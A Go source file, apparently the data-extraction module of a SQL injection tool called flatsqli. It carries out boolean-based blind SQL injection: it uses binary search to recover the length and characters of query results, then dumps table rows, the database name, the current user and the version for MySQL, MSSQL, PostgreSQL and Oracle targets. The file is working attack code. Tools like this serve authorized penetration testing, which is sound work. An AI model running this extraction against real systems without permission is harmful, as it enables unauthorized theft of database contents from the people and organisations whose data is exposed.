package extractor

import (
	"fmt"
	"strings"

	"github.com/morkin1792/flatsqli/internal/calibrator"
	"github.com/morkin1792/flatsqli/internal/detector"
	"github.com/morkin1792/flatsqli/internal/payloads"
	"github.com/morkin1792/flatsqli/internal/requester"
	"github.com/morkin1792/flatsqli/internal/ui"
)

// Extractor handles data extraction using boolean-based SQL injection
type Extractor struct {
	requester   *requester.Requester
	calibration *calibrator.CalibrationResult
	dbType      detector.DatabaseType
	payloadGen  payloads.DatabasePayloads
	verbose     bool
	maxLen      int
}

// New creates a new Extractor
func New(req *requester.Requester, cal *calibrator.CalibrationResult, dbType detector.DatabaseType, verbose bool) *Extractor {
	return &Extractor{
		requester:   req,
		calibration: cal,
		dbType:      dbType,
		payloadGen:  payloads.GetPayloadsForDatabase(dbType.ToPayloadType()),
		verbose:     verbose,
		maxLen:      70, // Default max length
	}
}

// SetMaxLen sets the maximum extraction length (0 = no limit)
func (e *Extractor) SetMaxLen(maxLen int) {
	e.maxLen = maxLen
}

// ExtractQuery extracts the result of a custom SQL query
func (e *Extractor) ExtractQuery(query string) (string, error) {
	if e.payloadGen == nil {
		return "", fmt.Errorf("no payload generator available for database type: %s", e.dbType)
	}

	ui.Verbose(e.verbose, "Extracting query: %s", query)

	return e.extractString(query)
}

// ExtractVersion extracts the database version
func (e *Extractor) ExtractVersion() (string, error) {
	if e.payloadGen == nil {
		return "", fmt.Errorf("no payload generator available for database type: %s", e.dbType)
	}

	queries := e.payloadGen.GetVersionQueries()
	if len(queries) == 0 {
		return "", fmt.Errorf("no version queries available for database type: %s", e.dbType)
	}

	var bestVersion string

	// Try each version query
	for _, query := range queries {
		ui.Verbose(e.verbose, "Trying version query: %s", query)

		version, err := e.extractString(query)

		// Keep the longest version found
		if len(version) > len(bestVersion) {
			bestVersion = version
		}

		if err != nil {
			ui.Verbose(e.verbose, "Query failed/incomplete: %v", err)
			continue
		}

		if version != "" {
			return version, nil
		}
	}

	if bestVersion != "" {
		ui.Verbose(e.verbose, "Returning best partial version found")
		return bestVersion, nil
	}

	return "", fmt.Errorf("could not extract version")
}

// extractString extracts a string value using binary search
func (e *Extractor) extractString(query string) (string, error) {
	// First, find the length
	length, err := e.findLength(query)
	if err != nil {
		return "", fmt.Errorf("failed to find length: %w", err)
	}

	if length == 0 {
		return "", nil
	}

	// Apply max length limit if set
	if e.maxLen > 0 && length > e.maxLen {
		ui.Verbose(e.verbose, "String length %d exceeds max %d, capping", length, e.maxLen)
		length = e.maxLen
	}

	ui.Verbose(e.verbose, "String length: %d", length)

	// Extract each character using prefix-based optimization
	result := make([]byte, 0, length)
	for i := 1; i <= length; i++ {
		char, err := e.findCharWithPrefixes(query, i, string(result))
		if err != nil {
			ui.ProgressDone()
			// Return what we have so far, WITH the error
			if len(result) > 0 {
				return string(result), err
			}
			return "", fmt.Errorf("failed to extract char at position %d: %w", i, err)
		}
		result = append(result, char)
		// Show live progress with extracted chars and position
		ui.Progress("Extracting: %s [%d/%d]", string(result), i, length)
	}
	ui.ProgressDone()

	return string(result), nil
}

// findLength finds the length of a query result using binary search
func (e *Extractor) findLength(query string) (int, error) {
	low := 0
	high := 1024 // Max length to search

	// First, check if there's any data at all
	payload := e.payloadGen.GetLengthPayload(query, 0) // LENGTH > 0
	resp, err := e.requester.Send(payload)
	if err != nil {
		return 0, err
	}

	if !e.calibration.IsTrue(resp.Fingerprint) {
		return 0, nil // No data
	}

	// Binary search for the exact length
	for low < high {
		mid := (low + high + 1) / 2
		payload := e.payloadGen.GetLengthPayload(query, mid-1) // LENGTH > mid-1

		resp, err := e.requester.Send(payload)
		if err != nil {
			return 0, err
		}

		if e.calibration.IsTrue(resp.Fingerprint) {
			low = mid
		} else {
			high = mid - 1
		}
	}

	return low, nil
}

// findChar finds a character at a position using binary search
func (e *Extractor) findChar(query string, pos int) (byte, error) {
	low := 32   // Space (printable ASCII start)
	high := 126 // ~ (printable ASCII end)

	for low < high {
		mid := (low + high + 1) / 2
		payload := e.payloadGen.GetCharPayload(query, pos, mid-1) // ASCII > mid-1

		resp, err := e.requester.Send(payload)
		if err != nil {
			return 0, err
		}

		if e.calibration.IsTrue(resp.Fingerprint) {
			low = mid
		} else {
			high = mid - 1
		}
	}

	return byte(low), nil
}

// findCharWithPrefixes tries to find a character using known version prefixes first,
// then falls back to binary search if no prefix matches.
func (e *Extractor) findCharWithPrefixes(query string, pos int, currentResult string) (byte, error) {
	// Get candidate prefixes that match what we have so far
	prefixes := payloads.GetVersionPrefixes(e.dbType.ToPayloadType())
	var candidates []string
	for _, p := range prefixes {
		if len(p) >= pos && strings.HasPrefix(p, currentResult) {
			candidates = append(candidates, p)
		}
	}

	// If we have candidates, try equality check for each unique char at this position
	if len(candidates) > 0 {
		uniqueChars := getUniqueCharsAtPosition(candidates, pos)
		for _, c := range uniqueChars {
			// Try equality check: ASCII(char) = c
			payload := e.payloadGen.GetEqualityPayload(query, pos, int(c))
			resp, err := e.requester.Send(payload)
			if err != nil {
				// On error, fall back to binary search
				return e.findChar(query, pos)
			}
			if e.calibration.IsTrue(resp.Fingerprint) {
				return c, nil
			}
		}
	}

	// No prefix match - fall back to binary search
	return e.findChar(query, pos)
}

// getUniqueCharsAtPosition returns unique characters at the given position (1-indexed)
// from a list of prefix strings.
func getUniqueCharsAtPosition(prefixes []string, pos int) []byte {
	seen := make(map[byte]bool)
	var result []byte
	for _, p := range prefixes {
		if pos <= len(p) {
			c := p[pos-1] // pos is 1-indexed
			if !seen[c] {
				seen[c] = true
				result = append(result, c)
			}
		}
	}
	return result
}

// ExtractTable extracts all rows from a table (limited extraction)
func (e *Extractor) ExtractTable(table, column string, limit int) ([]string, error) {
	var results []string

	for i := 0; i < limit; i++ {
		query := e.buildRowQuery(table, column, i)

		ui.Verbose(e.verbose, "Extracting row %d from %s.%s", i, table, column)

		value, err := e.extractString(query)

		// If we got some value, append it even if there was an error
		if value != "" {
			results = append(results, value)
		}

		if err != nil {
			break
		}
	}

	return results, nil
}

// buildRowQuery builds a query to extract a single row
func (e *Extractor) buildRowQuery(table, column string, offset int) string {
	switch e.dbType {
	case detector.MySQL:
		return fmt.Sprintf("SELECT %s FROM %s LIMIT 1 OFFSET %d", column, table, offset)
	case detector.MSSQL:
		return fmt.Sprintf("SELECT %s FROM %s ORDER BY 1 OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY", column, table, offset)
	case detector.PostgreSQL:
		return fmt.Sprintf("SELECT %s FROM %s LIMIT 1 OFFSET %d", column, table, offset)
	case detector.Oracle:
		return fmt.Sprintf("SELECT %s FROM (SELECT %s, ROWNUM rn FROM %s) WHERE rn=%d", column, column, table, offset+1)
	default:
		return fmt.Sprintf("SELECT %s FROM %s LIMIT 1 OFFSET %d", column, table, offset)
	}
}

// GetDatabaseName extracts the current database name
func (e *Extractor) GetDatabaseName() (string, error) {
	var query string

	switch e.dbType {
	case detector.MySQL:
		query = "SELECT database()"
	case detector.MSSQL:
		query = "SELECT DB_NAME()"
	case detector.PostgreSQL:
		query = "SELECT current_database()"
	case detector.Oracle:
		query = "SELECT ora_database_name FROM dual"
	default:
		return "", fmt.Errorf("unsupported database type")
	}

	return e.extractString(query)
}

// GetCurrentUser extracts the current database user
func (e *Extractor) GetCurrentUser() (string, error) {
	var query string

	switch e.dbType {
	case detector.MySQL:
		query = "SELECT user()"
	case detector.MSSQL:
		query = "SELECT SYSTEM_USER"
	case detector.PostgreSQL:
		query = "SELECT current_user"
	case detector.Oracle:
		query = "SELECT user FROM dual"
	default:
		return "", fmt.Errorf("unsupported database type")
	}

	return e.extractString(query)
}
